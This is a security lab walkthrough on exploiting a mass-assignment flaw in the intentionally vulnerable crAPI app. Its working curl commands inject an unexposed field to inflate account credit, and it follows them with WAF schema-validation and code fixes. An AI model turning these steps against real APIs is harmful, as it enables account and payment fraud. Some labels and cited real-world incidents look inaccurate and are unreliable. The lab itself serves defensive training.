# 05 — crAPI Mass Assignment

**Vulnerability class:** [OWASP API6:2023 — Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
/ mass assignment.

crAPI's user-update endpoint accepts arbitrary JSON and merges it into
the user object. An attacker can promote themselves to admin or change
another user's credit balance by including fields the UI never exposes.

## Setup

```bash
task crapi:seed
task test   # confirm endpoints reachable
```

## Baseline: attack succeeds (WAF off)

### Step 1 — Log in as user1 and confirm baseline credit

```bash
HOST_IP=$(grep ^LAB_HOST_IP lab.env | cut -d= -f2)
DOMAIN=$(grep ^LAB_DOMAIN   lab.env | cut -d= -f2)

TOKEN=$(curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  "https://crapi.${DOMAIN}/identity/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user1@lab.local","password":"Passw0rd!"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

curl -sk \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${TOKEN}" \
  "https://crapi.${DOMAIN}/workshop/api/shop/products" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(f"Starting credit: {d[\"credit\"]}")'
```

Expected: `Starting credit: 100.0`.

### Step 2 — Submit an order with an injected `return_qty_left` field

The legitimate flow: POST an order, crAPI charges your credit. The
vulnerability: the order endpoint accepts fields that should be
server-computed.

```bash
# Normal order
ORDER_ID=$(curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  "https://crapi.${DOMAIN}/workshop/api/shop/orders" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{"product_id":1,"quantity":1}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["order"]["id"])')

echo "Order ID: $ORDER_ID"

# Now "return" the order but inject a massive quantity
curl -sk -X POST \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  "https://crapi.${DOMAIN}/workshop/api/shop/orders/return_order?order_id=${ORDER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{"return_qty_left": 99999}' \
  | python3 -m json.tool
```

### Step 3 — Check the new credit

```bash
curl -sk \
  --resolve "crapi.${DOMAIN}:443:${HOST_IP}" \
  -H "Authorization: Bearer ${TOKEN}" \
  "https://crapi.${DOMAIN}/workshop/api/shop/products" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(f"New credit: {d[\"credit\"]}")'
```

**Expected (attack succeeds):** credit is now `999990.0` or similar —
the return amount was multiplied by the injected quantity with no
server-side check.

The `return_qty_left` field was never in the API spec for this
endpoint. crAPI's Python code pulls in the whole JSON body with
`request.json` and merges it into the order object with no allowlist.

## Observability

**Grafana panel:** *Total Request Rate* shows a single request. No
traffic-volume signal.

**Log tail (`task logs:nginx`):**

```
<attacker-ip> - - [..] "POST /workshop/api/shop/orders/return_order?order_id=<id> HTTP/1.1" 200 ...
```

The response is 200 with a small body. Again, **the attack is invisible
to NGINX** — the payload is well-formed JSON, the path is legitimate,
the user is authenticated.

This scenario is the strongest argument for **schema-aware** WAF
features (OpenAPI validation, allowlisted fields) over
signature-based detection.

## Protected: attack blocked (`task waf-on`)

### On NGINX Plus

App Protect supports OpenAPI file import:

```yaml
# Placeholder -- not in the lab's default policy
openapi-file:
  link: /path/to/crapi-openapi.yaml
  policy:
    reject-unknown-fields: true
```

With this, Step 2's `return_qty_left` field fails validation:

```
HTTP/1.1 400 Bad Request — violations="VIOL_JSON_SCHEMA"
```

But this requires you to *have* an OpenAPI spec for crAPI. The signature
policy shipped in this lab does not catch mass assignment by itself —
it's a legitimate-shape attack. Step 2 still succeeds in default Plus
mode.

### On OSS (shadow mode)

No enforcement.

**Application-layer mitigations (the only real fix):**

1. **Explicit allowlist in the serializer.** Django REST Framework:
   `fields = ['product_id', 'quantity']` on the serializer — anything
   else is ignored.
2. **Parse into a strict DTO.** Don't `user.__dict__.update(body)`.
3. **Log and alert on unexpected fields.** If a field arrives that
   isn't in the schema, that's either a new deployment or an attack.

## Real-world correlate

- **Parse / GitHub 2015:** users could set `isAdmin=true` on their own
  profile via mass assignment in the user-update endpoint.
- **Rails Issue #5228 (2012):** the "GitHub hack" that prompted Rails
  to add strong parameters. Direct attribute assignment from request
  params is the textbook example of this class.

## Further experiments

- Try `{"isAdmin": true}` and `{"role": "admin"}` on the user profile
  update endpoint — crAPI may accept these too.
- Use the [API Security Testing Methodology](https://owasp.org/www-project-api-security/)
  checklist. Mass assignment is pattern #6; work through the others.
- Compare with the [GoTestWAF](../../jobs/gotestwaf-job.yaml) report's
  `apiSec` section — mass assignment is typically in the "blind spot"
  portion of any signature-based WAF score.
